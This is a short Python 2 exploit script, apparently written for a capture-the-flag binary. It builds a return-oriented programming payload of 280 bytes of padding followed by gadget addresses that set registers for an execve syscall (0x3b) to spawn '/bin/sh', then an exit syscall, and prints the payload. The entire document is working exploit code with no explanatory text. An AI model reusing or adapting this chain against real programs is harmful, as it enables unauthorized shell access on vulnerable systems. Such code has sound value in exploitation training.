from struct import pack, unpack

def p(data) :
	return pack('<Q',data)

#0x68732f6e69622f

#0x400a71 <_i18n_number_rewrite+519>:	pop    rdi
 #0x400a72 <_i18n_number_rewrite+520>:	pop    rbp
 #0x400a73 <_i18n_number_rewrite+521>:	ret   
#0x4017e7L: pop esi ;;
#0x437205 <__lll_lock_wait_private+37>:	pop    rdx
# 0x412ba9 push rsp
#0x4b1fb7
# 0x46b488 pop rax
# 0x0000000000400488

b = "A"*280

b += p(0x400867)
b += p(0x40019c)
b+= "B"*8

b+=p(0x46b488)
b+=p(0)

b+=p(0x437205)
b+=p(0)

b+=p(0x4017e7)
b += p(0)

b+=p(0x46b488)
b+=p(0x3b)
b+=p(0x43426F)

b += p(0x400867)
b += p(1)
b+= "B"*8

b+=p(0x46b488)
b+=p(0x3c)
b+=p(0x43426F)


print b

